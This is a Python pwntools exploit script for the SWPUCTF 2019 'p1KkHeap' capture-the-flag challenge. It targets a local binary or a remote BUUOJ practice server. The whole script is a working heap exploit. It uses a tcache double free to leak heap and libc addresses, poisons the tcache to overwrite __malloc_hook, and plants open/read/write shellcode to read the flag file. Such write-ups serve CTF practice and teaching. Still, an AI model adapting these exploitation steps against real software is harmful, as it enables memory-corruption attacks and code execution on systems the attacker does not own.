#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./SWPUCTF_2019_p1KkHeap')
	elf = ELF('./SWPUCTF_2019_p1KkHeap',checksec=False)
 	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote('node3.buuoj.cn',27063)
	elf = ELF('./SWPUCTF_2019_p1KkHeap',checksec=False)
 	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

context.arch='amd64'

def menu(cmd):
    sla("Your Choice: ",str(cmd))

def add(size):
    menu(1)
    sla("size: ",str(size))

def edit(idx,content):
    menu(3)
    sda("id: ",str(idx))
    sda("content: ",content)

def show(idx):
    menu(2)
    sla("id: ",str(idx))

def delete(idx):
    menu(4)
    sla("id: ",str(idx))

###leak heap###
add(0x80)#0
add(0x80)#1

delete(0)
delete(0)

show(0)
ru("content: ")
heap = u64(ru('\x55')[-6:].ljust(8,'\x00')) - 0x260

###leak libc###
add(0x80)#0 2
structure = heap + 0x88
edit(2,p64(structure))

shellcode=shellcraft.amd64.open('flag')
shellcode+=shellcraft.amd64.read(3,0x66660300,64)
shellcode+=shellcraft.amd64.write(1,0x66660300,64)

add(0x80)#3
add(0x80)#4
payload = p64(0x66660000)
edit(4,payload)

add(0x80)#5
edit(5,asm(shellcode))

delete(0)
show(0)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x3ebc40
malloc_hook = libc_base + libc.symbols['__malloc_hook']

payload = p64(malloc_hook)
edit(4,payload)
add(0x80)#6
edit(6,p64(0x66660000))

###get shell###
add(0x80)
ia()